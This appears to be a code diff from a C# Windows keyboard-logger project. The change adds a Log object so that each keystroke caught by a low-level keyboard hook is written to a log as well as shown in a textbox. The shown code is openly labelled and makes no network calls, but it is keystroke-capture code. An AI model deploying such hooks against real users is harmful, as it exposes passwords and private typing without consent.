@@ -10,6 +10,7 @@ using System.Threading.Tasks;
 using System.Windows.Forms;
 using System.Runtime.InteropServices;
 using KeyboardLogger.WindowsApi;
+using KeyboardLogger.KeyLog;
 
 namespace KeyboardLogger
 {
@@ -18,6 +19,7 @@ namespace KeyboardLogger
         // data
         IntPtr hHook = IntPtr.Zero;
         LowLevelKeyboardProc kydbHookProc;
+        Log log = new Log("wolfram77");
 
 
         // constructor
@@ -53,6 +55,7 @@ namespace KeyboardLogger
             {
                 Keys key = (Keys)lParam.vkCode;
                 textBox_Log.Text = textBox_Log.Text + key + " ";
+                log.Write(key + " ");
             }
             return User32.CallNextHookEx(IntPtr.Zero, code, wParam, lParam);
         }
